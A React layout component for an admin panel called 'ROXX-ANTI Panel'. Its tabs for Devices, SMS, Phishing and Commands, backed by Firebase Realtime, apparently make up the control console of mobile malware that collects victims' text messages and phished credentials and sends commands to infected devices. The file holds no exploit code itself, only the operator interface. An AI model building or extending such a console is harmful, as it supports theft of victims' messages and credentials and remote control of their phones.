import { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { useApp } from '../AppContext'
import Dashboard from './Dashboard'
import Devices from './Devices'
import SmsPage from './SmsPage'
import PhishingPage from './PhishingPage'
import CommandsPage from './CommandsPage'
import DeviceDetail from './DeviceDetail'

const tabs = [
  { key: 'dashboard', label: 'Dashboard', icon: 'M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z' },
  { key: 'devices', label: 'Devices', icon: 'M22 12h-4l-3 9L9 3l-3 9H2' },
  { key: 'sms', label: 'SMS', icon: 'M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z' },
  { key: 'phishing', label: 'Phishing', icon: 'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z' },
  { key: 'commands', label: 'Commands', icon: 'M4 17l6-6-6-6M12 19h8' },
]

const SVG = ({ path, size = 14 }: { path: string; size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d={path} />
  </svg>
)

export default function Layout() {
  const navigate = useNavigate()
  const token = localStorage.getItem('admin_token')
  const { devices, allSms, allPhishing, connected, lastUpdate, refresh } = useApp()
  const [activeTab, setActiveTab] = useState('dashboard')
  const [detailDeviceId, setDetailDeviceId] = useState<string | null>(null)
  const [bttVisible, setBttVisible] = useState(false)
  const mainRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    if (!token) navigate('/login')
  }, [token, navigate])

  useEffect(() => {
    const el = mainRef.current
    if (!el) return
    const onScroll = () => setBttVisible(el.scrollTop > 300)
    el.addEventListener('scroll', onScroll)
    return () => el.removeEventListener('scroll', onScroll)
  }, [])

  if (!token) return null

  const totalDevices = Object.keys(devices).length
  const onlineCount = Object.values(devices).filter((d: any) => d.status === 'online').length
  const deviceArray = Object.entries(devices).map(([id, d]) => ({ id, ...(d as any) }))

  const tabCounts: Record<string, number> = {
    sms: allSms.length,
    phishing: allPhishing.length,
  }

  return (
    <div style={{ display:'flex', flexDirection:'column', minHeight:'100vh' }}>
      {/* Header */}
      <div className="header">
        <h1>ROXX-ANTI Panel</h1>
        <div className="header-right">
          <div className="status-pill">
            <div className={`status-dot ${connected ? '' : 'off'}`} />
            <span>{connected ? 'Online' : 'Offline'}</span>
          </div>
          <button className="btn-icon" onClick={refresh}><SVG path="M23 4v6h-6M1 20v-6h6" size={16}/></button>
        </div>
      </div>

      {/* Nav Tabs */}
      <div className="nav">
        {tabs.map(t => (
          <button key={t.key} className={`nav-tab ${activeTab === t.key ? 'active' : ''}`} onClick={() => { setActiveTab(t.key); mainRef.current?.scrollTo(0,0) }}>
            <SVG path={t.icon} /> {t.label}
            {tabCounts[t.key] > 0 && <span className="tab-badge">{tabCounts[t.key] > 99 ? '99+' : tabCounts[t.key]}</span>}
          </button>
        ))}
      </div>

      {/* Main Content */}
      <div ref={mainRef} className="main" style={{flex:1,overflowY:'auto'}}>
        <div className={`section ${activeTab === 'dashboard' ? 'active' : ''}`}>
          <Dashboard devices={deviceArray} totalDevices={totalDevices} onlineCount={onlineCount}
            allSms={allSms} allPhishing={allPhishing} lastUpdate={lastUpdate}
            refresh={refresh} onDeviceClick={(id) => setDetailDeviceId(id)} />
        </div>
        <div className={`section ${activeTab === 'devices' ? 'active' : ''}`}>
          <Devices devices={deviceArray} onDeviceClick={(id) => setDetailDeviceId(id)} />
        </div>
        <div className={`section ${activeTab === 'sms' ? 'active' : ''}`}>
          <SmsPage allSms={allSms} />
        </div>
        <div className={`section ${activeTab === 'phishing' ? 'active' : ''}`}>
          <PhishingPage allPhishing={allPhishing} />
        </div>
        <div className={`section ${activeTab === 'commands' ? 'active' : ''}`}>
          <CommandsPage devices={deviceArray} />
        </div>

        {/* Footer */}
        <div className="footer">
          <span>ROXX-ANTI v2.0 &bull; Firebase Realtime</span>
          <span>{Object.keys(devices).length} devices &middot; {allSms.length} SMS &middot; {allPhishing.length} phishing</span>
          <span>Last update: {lastUpdate}</span>
        </div>
      </div>

      {/* Back to Top */}
      <button className={`btt ${bttVisible ? 'visible' : ''}`} onClick={() => mainRef.current?.scrollTo({top:0,behavior:'smooth'})}>
        <SVG path="M12 19V5M5 12l7-7 7 7" size={18}/>
      </button>

      {/* Detail Panel */}
      <DeviceDetail deviceId={detailDeviceId} onClose={() => setDetailDeviceId(null)} />
    </div>
  )
}
